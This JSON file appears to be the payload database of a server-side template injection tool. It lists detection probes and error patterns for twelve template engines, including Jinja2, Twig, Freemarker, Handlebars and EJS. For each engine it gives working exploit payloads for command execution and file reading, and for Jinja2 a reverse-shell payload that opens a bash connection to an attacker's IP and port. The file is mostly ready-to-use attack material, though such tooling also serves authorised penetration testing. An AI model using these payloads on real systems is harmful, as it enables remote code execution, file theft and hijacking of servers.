{
    "engines": {
        "Jinja2": {
            "detection": {
                "error_regex": [
                    "jinja2\\.exceptions\\..*",
                    "TemplateSyntaxError.*Jinja2"
                ],
                "evaluation": {
                    "payload": "{{7*'7'}}",
                    "expected": "7777777"
                },
                "reflection_markers": ["{{", "}}", "{%", "%}"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('COMMAND').read() }}",
                    "description": "Python os module access"
                },
                "file_read": {
                    "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['open']('FILE').read() }}",
                    "description": "File read via builtin open"
                },
                "reverse_shell": {
                    "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').system('bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"') }}"
                }
            }
        },
        "Twig (PHP)": {
            "detection": {
                "error_regex": [
                    "Twig_Error_Syntax.*",
                    "Twig\\\\.*Exception"
                ],
                "evaluation": {
                    "payload": "{{7*7}}",
                    "expected": "49"
                },
                "reflection_markers": ["{{", "}}", "{%", "%}"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('COMMAND') }}",
                    "description": "Direct exec access"
                },
                "file_read": {
                    "payload": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('cat FILE') }}"
                }
            }
        },
        "Freemarker": {
            "detection": {
                "error_regex": [
                    "FreeMarker template error.*",
                    "freemarker\\.core\\..*"
                ],
                "evaluation": {
                    "payload": "${7*7}",
                    "expected": "49"
                },
                "reflection_markers": ["${", "}", "<#", ">"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"COMMAND\") }",
                    "description": "Built-in Execute class"
                },
                "file_read": {
                    "payload": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\"FILE\").toURL().openStream().readAllBytes()?join(\" \")}"
                }
            }
        },
        "Velocity": {
            "detection": {
                "error_regex": [
                    "org\\.apache\\.velocity\\.runtime\\.parser\\.ParseException.*",
                    "Velocity syntax error.*"
                ],
                "evaluation": {
                    "payload": "#set($x=7*7)$x",
                    "expected": "49"
                },
                "reflection_markers": ["#", "$"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "#set($str=$class.inspect(\"java.lang.String\"))#set($chr=$class.inspect(\"java.lang.Character\"))#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"COMMAND\"))"
                },
                "file_read": {
                    "payload": "#set($is=$class.inspect(\"java.io.InputStream\"))#set($fis=$class.inspect(\"java.io.FileInputStream\").type.getConstructor($str.type).newInstance(\"FILE\"))"
                }
            }
        },
        "Handlebars": {
            "detection": {
                "error_regex": [
                    "Handlebars\\.Compiler\\.CompilerException.*",
                    "Parse error on line.*Handlebars"
                ],
                "evaluation": {
                    "payload": "{{7*7}}",
                    "expected": "49"
                },
                "reflection_markers": ["{{", "}}"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "{{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('child_process').execSync('COMMAND').toString();\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}"
                },
                "file_read": {
                    "payload": "{{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('fs').readFileSync('FILE', 'utf8');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}"
                }
            }
        },
        "ERB (Ruby)": {
            "detection": {
                "error_regex": [
                    "ActionView::Template::Error.*",
                    "ERB::.*"
                ],
                "evaluation": {
                    "payload": "<%= 7*7 %>",
                    "expected": "49"
                },
                "reflection_markers": ["<%=", "<%", "%>"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "<%= `COMMAND` %>",
                    "description": "Backtick execution"
                },
                "file_read": {
                    "payload": "<%= File.read('FILE') %>"
                }
            }
        },
        "Mako": {
            "detection": {
                "error_regex": [
                    "mako\\.exceptions\\..*",
                    "SyntaxException.*Mako"
                ],
                "evaluation": {
                    "payload": "${7*7}",
                    "expected": "49"
                },
                "reflection_markers": ["${", "}"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "<% import os %>${os.popen('COMMAND').read()}"
                },
                "file_read": {
                    "payload": "${open('FILE').read()}"
                }
            }
        },
        "Smarty": {
            "detection": {
                "error_regex": [
                    "Smarty Compiler: Syntax error.*",
                    "Smarty\\\\.*Exception"
                ],
                "evaluation": {
                    "payload": "{7*7}",
                    "expected": "49"
                },
                "reflection_markers": ["{", "}"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "{php}echo `COMMAND`;{/php}",
                    "description": "Requires {php} tags enabled"
                }
            }
        },
        "Tornado": {
            "detection": {
                "error_regex": [
                    "tornado\\.template\\..*",
                    "TemplateParseError.*"
                ],
                "evaluation": {
                    "payload": "{{7*7}}",
                    "expected": "49"
                },
                "reflection_markers": ["{{", "}}"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "{% import os %}{{ os.popen('COMMAND').read() }}"
                }
            }
        },
        "Django Templates": {
            "detection": {
                "error_regex": [
                    "django\\.template\\.exceptions\\..*",
                    "TemplateSyntaxError.*Django"
                ],
                "evaluation": {
                    "payload": "{7*7}",
                    "expected": "49",
                    "note": "Only works with some configurations"
                },
                "reflection_markers": ["{{", "}}", "{%", "%}"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "{% debug %}{{ settings.SECRET_KEY }}",
                    "description": "Information disclosure first"
                }
            }
        },
        "EJS": {
            "detection": {
                "error_regex": [
                    "SyntaxError: Unexpected token.* in ejs",
                    "EJS compilation error"
                ],
                "evaluation": {
                    "payload": "<%= 7*7 %>",
                    "expected": "49"
                },
                "reflection_markers": ["<%=", "<%", "%>"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "<%= global.process.mainModule.require('child_process').execSync('COMMAND') %>"
                }
            }
        },
        "Pug/Jade": {
            "detection": {
                "error_regex": [
                    "Syntax Error: Jade\\..*",
                    "pug\\..*Error"
                ],
                "evaluation": {
                    "payload": "#{7*7}",
                    "expected": "49"
                },
                "reflection_markers": ["#{", "}"]
            },
            "exploit": {
                "command_exec": {
                    "payload": "- var x = global.process.mainModule.require('child_process').execSync('COMMAND')"
                }
            }
        }
    },
    "notes": {
        "general": [
            "Test payloads in different contexts (HTML vs text)",
            "Some payloads require specific template configurations",
            "Always URL-encode payloads when necessary",
            "Combine with reflection testing for verification",
            "Update payloads regularly as frameworks patch vulnerabilities"
        ],
        "engine_specific": {
            "Smarty": "Requires {php} tags enabled in Smarty configuration",
            "Django": "Django templates are generally sandboxed - focus on information disclosure first",
            "Handlebars": "Node.js specific payloads shown - adjust for other implementations"
        }
    }
}
